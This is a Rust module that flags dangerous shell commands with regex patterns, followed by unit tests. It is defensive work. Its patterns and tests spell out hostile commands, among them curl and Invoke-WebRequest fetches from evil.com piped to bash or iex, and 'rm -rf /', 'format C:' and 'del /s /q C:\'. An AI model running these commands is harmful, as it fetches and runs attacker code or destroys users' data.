use regex::Regex;
use serde::Serialize;
use std::sync::LazyLock;

/// Result of analyzing a command for dangerous patterns.
#[derive(Debug, Clone, Serialize, PartialEq)]
pub struct DangerAnalysis {
    pub is_dangerous: bool,
    pub reason: String,
    pub danger_level: String,
}

/// A single danger pattern: compiled regex, human-readable reason, and severity.
struct DangerPattern {
    regex: Regex,
    reason: &'static str,
    level: &'static str,
}

/// All danger patterns, compiled once at startup.
static DANGER_PATTERNS: LazyLock<Vec<DangerPattern>> = LazyLock::new(|| {
    let patterns: Vec<(&str, &str, &str)> = vec![
        // --- Destructive commands ---
        // Unix: rm -rf, rm -r --no-preserve-root, etc.
        (r"(?i)\brm\s+.*-\w*r\w*f", "Recursive force delete command", "high"),
        (r"(?i)\brm\s+.*-\w*f\w*r", "Recursive force delete command", "high"),
        // Windows CMD: del /s /q
        (r"(?i)\bdel\s+.*\/s", "Recursive delete command", "high"),
        // PowerShell: Remove-Item -Recurse -Force
        (r"(?i)\bRemove-Item\b.*-Recurse", "Recursive delete command", "high"),
        // format / fdisk
        (r"(?i)\bformat\s+[a-z]:", "Disk format command", "high"),
        (r"(?i)\bfdisk\b", "Disk partition command", "high"),
        // mkfs
        (r"(?i)\bmkfs\b", "Filesystem format command", "high"),
        // Windows: rd /s /q
        (r"(?i)\brd\s+.*\/s", "Recursive directory delete command", "high"),
        (r"(?i)\brmdir\s+.*\/s", "Recursive directory delete command", "high"),

        // --- System modification ---
        (r"(?i)\breg\s+delete\b", "Registry delete command", "high"),
        (r"(?i)\bSet-ExecutionPolicy\b", "Execution policy change", "medium"),
        (r"(?i)\bchmod\s+777\b", "Setting world-writable permissions", "medium"),
        (r"(?i)\bchown\b", "Ownership change command", "medium"),
        // dd — dangerous raw disk write
        (r"(?i)\bdd\s+.*\bof=", "Raw disk write command", "high"),

        // --- Network exfiltration ---
        // curl ... | bash/sh/powershell
        (r"(?i)\bcurl\b.*\|\s*(bash|sh|zsh|powershell|pwsh)\b", "Piping remote content to shell", "high"),
        // wget ... | bash/sh
        (r"(?i)\bwget\b.*\|\s*(bash|sh|zsh|powershell|pwsh)\b", "Piping remote content to shell", "high"),
        // Invoke-WebRequest ... | iex  (or Invoke-Expression)
        (r"(?i)\bInvoke-WebRequest\b.*\|\s*i(nvoke-Expression|ex)\b", "Piping remote content to PowerShell execution", "high"),
        // iwr ... | iex (alias forms)
        (r"(?i)\biwr\b.*\|\s*i(nvoke-Expression|ex)\b", "Piping remote content to PowerShell execution", "high"),
        // Invoke-RestMethod ... | iex
        (r"(?i)\bInvoke-RestMethod\b.*\|\s*i(nvoke-Expression|ex)\b", "Piping remote content to PowerShell execution", "high"),

        // --- Credential access ---
        (r"(?i)\bcmdkey\b", "Credential manager access", "medium"),
        (r"(?i)\bnet\s+user\b", "User account modification", "medium"),
        (r"(?i)(^|[;&|]\s*)\bpasswd\b", "Password change command", "medium"),

        // --- Service / process control ---
        (r"(?i)\bsc\s+stop\b", "Service stop command", "medium"),
        (r"(?i)\bsc\s+delete\b", "Service delete command", "high"),
        (r"(?i)\bStop-Service\b", "Service stop command", "medium"),
        (r"(?i)\bkill\s+.*-9\b", "Force kill process", "medium"),
        (r"(?i)\btaskkill\s+.*\/f\b", "Force kill process", "medium"),

        // --- Sub-shell wrappers ---
        (r"(?i)\bcmd\s+/c\b", "Command runs in sub-shell — review the inner command", "medium"),
        (r"(?i)\bpowershell\s+-[cC]ommand\b", "Command runs in sub-shell — review the inner command", "medium"),
        (r"(?i)\bbash\s+-c\b", "Command runs in sub-shell — review the inner command", "medium"),
        (r"(?i)\bsh\s+-c\b", "Command runs in sub-shell — review the inner command", "medium"),
        (r"(?i)\bwsl\s+.*\brm\b", "Command runs in sub-shell — review the inner command", "medium"),

        // --- Shutdown / reboot ---
        (r"(?i)\bshutdown\b", "System shutdown command", "high"),
        (r"(?i)\breboot\b", "System reboot command", "high"),
        (r"(?i)\bRestart-Computer\b", "System reboot command", "high"),
        (r"(?i)\bStop-Computer\b", "System shutdown command", "high"),
    ];

    patterns
        .into_iter()
        .map(|(pat, reason, level)| DangerPattern {
            regex: Regex::new(pat).expect("Invalid danger pattern regex"),
            reason,
            level,
        })
        .collect()
});

/// Analyze a command string for dangerous patterns.
///
/// The `shell_type` parameter is accepted for future shell-specific tuning
/// but currently all patterns are checked regardless of shell type.
pub fn analyze_command_danger(command: &str, _shell_type: &str) -> DangerAnalysis {
    for pattern in DANGER_PATTERNS.iter() {
        if pattern.regex.is_match(command) {
            return DangerAnalysis {
                is_dangerous: true,
                reason: pattern.reason.to_string(),
                danger_level: pattern.level.to_string(),
            };
        }
    }

    DangerAnalysis {
        is_dangerous: false,
        reason: String::new(),
        danger_level: String::new(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detects_rm_rf() {
        let result = analyze_command_danger("rm -rf /", "wsl");
        assert!(result.is_dangerous, "rm -rf / should be flagged as dangerous");
        assert_eq!(result.danger_level, "high");
        assert!(!result.reason.is_empty());
    }

    #[test]
    fn test_detects_rm_rf_home() {
        let result = analyze_command_danger("rm -rf ~/*", "wsl");
        assert!(result.is_dangerous);
    }

    #[test]
    fn test_detects_rm_fr_variant() {
        // Some people write rm -fr instead of rm -rf
        let result = analyze_command_danger("rm -fr /tmp/stuff", "wsl");
        assert!(result.is_dangerous);
    }

    #[test]
    fn test_detects_del_recursive() {
        let result = analyze_command_danger("del /s /q C:\\", "cmd");
        assert!(result.is_dangerous, "del /s /q C:\\ should be flagged");
        assert_eq!(result.danger_level, "high");
    }

    #[test]
    fn test_detects_curl_pipe_bash() {
        let result = analyze_command_danger("curl https://evil.com/script.sh | bash", "wsl");
        assert!(result.is_dangerous, "curl | bash should be flagged");
        assert_eq!(result.danger_level, "high");
    }

    #[test]
    fn test_detects_invoke_expression() {
        let result = analyze_command_danger(
            "Invoke-WebRequest https://evil.com/script.ps1 | iex",
            "powershell",
        );
        assert!(result.is_dangerous, "Invoke-WebRequest | iex should be flagged");
        assert_eq!(result.danger_level, "high");
    }

    #[test]
    fn test_detects_iwr_iex() {
        let result = analyze_command_danger("iwr https://evil.com/s.ps1 | iex", "powershell");
        assert!(result.is_dangerous);
    }

    #[test]
    fn test_detects_remove_item_recurse() {
        let result = analyze_command_danger(
            "Remove-Item -Path C:\\Temp -Recurse -Force",
            "powershell",
        );
        assert!(result.is_dangerous);
    }

    #[test]
    fn test_detects_format_drive() {
        let result = analyze_command_danger("format C:", "cmd");
        assert!(result.is_dangerous);
        assert_eq!(result.danger_level, "high");
    }

    #[test]
    fn test_detects_reg_delete() {
        let result = analyze_command_danger("reg delete HKLM\\Software\\Test", "cmd");
        assert!(result.is_dangerous);
    }

    #[test]
    fn test_detects_set_execution_policy() {
        let result = analyze_command_danger("Set-ExecutionPolicy Unrestricted", "powershell");
        assert!(result.is_dangerous);
        assert_eq!(result.danger_level, "medium");
    }

    #[test]
    fn test_detects_chmod_777() {
        let result = analyze_command_danger("chmod 777 /etc/passwd", "wsl");
        assert!(result.is_dangerous);
    }

    #[test]
    fn test_detects_taskkill() {
        let result = analyze_command_danger("taskkill /f /pid 1234", "cmd");
        assert!(result.is_dangerous);
    }

    #[test]
    fn test_detects_kill_9() {
        let result = analyze_command_danger("kill -9 1234", "wsl");
        assert!(result.is_dangerous);
    }

    #[test]
    fn test_detects_shutdown() {
        let result = analyze_command_danger("shutdown /s /t 0", "cmd");
        assert!(result.is_dangerous);
        assert_eq!(result.danger_level, "high");
    }

    #[test]
    fn test_detects_stop_service() {
        let result = analyze_command_danger("Stop-Service -Name wuauserv", "powershell");
        assert!(result.is_dangerous);
    }

    #[test]
    fn test_detects_net_user() {
        let result = analyze_command_danger("net user admin password123", "cmd");
        assert!(result.is_dangerous);
    }

    #[test]
    fn test_safe_command_not_flagged() {
        let result = analyze_command_danger("git status", "powershell");
        assert!(!result.is_dangerous, "git status should not be flagged");
        assert!(result.reason.is_empty());
        assert!(result.danger_level.is_empty());
    }

    #[test]
    fn test_ls_not_flagged() {
        let result = analyze_command_danger("ls -la", "wsl");
        assert!(!result.is_dangerous, "ls -la should not be flagged");
    }

    #[test]
    fn test_dir_not_flagged() {
        let result = analyze_command_danger("dir /s /b", "cmd");
        assert!(!result.is_dangerous);
    }

    #[test]
    fn test_npm_install_not_flagged() {
        let result = analyze_command_danger("npm install express", "powershell");
        assert!(!result.is_dangerous);
    }

    #[test]
    fn test_echo_not_flagged() {
        let result = analyze_command_danger("echo Hello World", "cmd");
        assert!(!result.is_dangerous);
    }

    #[test]
    fn test_cat_not_flagged() {
        let result = analyze_command_danger("cat /etc/passwd", "wsl");
        assert!(!result.is_dangerous);
    }

    #[test]
    fn test_case_insensitive_detection() {
        let result = analyze_command_danger("RM -RF /tmp", "wsl");
        assert!(result.is_dangerous, "Case-insensitive detection should work");
    }

    // --- Sub-shell wrapper tests ---

    #[test]
    fn test_detects_cmd_c_format() {
        let result = analyze_command_danger(r#"cmd /c "format C:""#, "cmd");
        assert!(result.is_dangerous, "cmd /c wrapping dangerous command should be flagged");
    }

    #[test]
    fn test_detects_cmd_c_simple() {
        let result = analyze_command_danger("cmd /c dir", "cmd");
        assert!(result.is_dangerous, "cmd /c should be flagged as sub-shell");
        assert_eq!(result.danger_level, "medium");
    }

    #[test]
    fn test_detects_powershell_command() {
        let result = analyze_command_danger(r#"powershell -Command "Remove-Item C:\Temp""#, "cmd");
        assert!(result.is_dangerous, "powershell -Command should be flagged");
        assert_eq!(result.danger_level, "medium");
    }

    #[test]
    fn test_detects_bash_c() {
        let result = analyze_command_danger(r#"bash -c "rm -rf /""#, "wsl");
        assert!(result.is_dangerous, "bash -c should be flagged");
    }

    #[test]
    fn test_detects_sh_c() {
        let result = analyze_command_danger(r#"sh -c "echo hello""#, "wsl");
        assert!(result.is_dangerous, "sh -c should be flagged as sub-shell");
        assert_eq!(result.danger_level, "medium");
    }

    #[test]
    fn test_detects_wsl_rm() {
        let result = analyze_command_danger("wsl rm -rf /home/user", "cmd");
        assert!(result.is_dangerous, "wsl rm should be flagged");
    }

    // --- passwd regex anchoring tests ---

    #[test]
    fn test_detects_passwd_after_semicolon() {
        let result = analyze_command_danger("; passwd", "wsl");
        assert!(result.is_dangerous, "passwd after semicolon should be flagged");
    }

    #[test]
    fn test_detects_passwd_after_pipe() {
        let result = analyze_command_danger("echo yes | passwd", "wsl");
        assert!(result.is_dangerous, "passwd after pipe should be flagged");
    }
}
